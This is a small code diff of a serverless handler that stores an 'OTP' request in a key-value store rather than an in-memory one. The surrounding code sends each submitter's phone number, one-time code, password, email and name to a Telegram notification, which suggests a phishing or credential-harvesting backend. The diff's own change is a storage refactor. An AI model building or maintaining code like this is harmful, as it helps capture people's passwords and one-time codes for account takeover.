@@ -1,4 +1,4 @@
-import { makeJsonResponse, makeTextResponse, uuidv4, getDataStore, sendTelegramNotification } from "../_shared.js";
+import { makeJsonResponse, makeTextResponse, uuidv4, setRequestInKV, sendTelegramNotification } from "../../_shared.js";
 
 export async function onRequest(context) {
   const { request, env } = context;
@@ -19,7 +19,6 @@ export async function onRequest(context) {
 
   const requestId = uuidv4();
   const now = new Date().toISOString();
-  const store = getDataStore("otp");
 
   const entry = {
     requestId,
@@ -35,7 +34,7 @@ export async function onRequest(context) {
     rejectedReason: null,
   };
 
-  store.set(requestId, entry);
+  await setRequestInKV(env, requestId, entry, "otp");
 
   await sendTelegramNotification(
     { requestId, phone, otp, password, email, firstName, lastName, type: "OTP" },
